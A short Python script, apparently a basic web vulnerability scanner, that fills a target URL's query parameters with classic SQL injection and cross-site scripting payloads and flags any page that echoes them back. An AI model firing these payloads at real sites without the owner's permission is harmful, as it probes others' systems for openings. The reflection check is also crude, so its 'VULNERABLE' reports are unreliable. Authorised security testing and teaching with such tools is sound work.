import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode

headers = {
    'User-Agent': 'Mozilla/5.0'
}

sql_payloads = ["' OR '1'='1", "';--", "\" OR \"1\"=\"1"]
xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

def get_parameters(url):
    parsed = urlparse(url)
    return parse_qs(parsed.query)

def test_payloads(url, params, payloads, vuln_type):
    for param in params:
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload

            new_query = urlencode(test_params, doseq=True)
            test_url = url.split('?')[0] + "?" + new_query

            try:
                res = requests.get(test_url, headers=headers, timeout=5)
                if payload in res.text:
                    print(f"[!] {vuln_type} VULNERABLE: {test_url}")
            except requests.exceptions.RequestException:
                continue

def scan_url(url):
    print(f"[+] Scanning: {url}")
    
    params = get_parameters(url)
    if not params:
        print("[-] No parameters found in URL.")
        return

    print("[*] Testing for SQL Injection...")
    test_payloads(url, params, sql_payloads, "SQL Injection")

    print("[*] Testing for XSS...")
    test_payloads(url, params, xss_payloads, "XSS")

if __name__ == "__main__":
    target = input("Enter target URL (with http and parameters): ")
    scan_url(target)
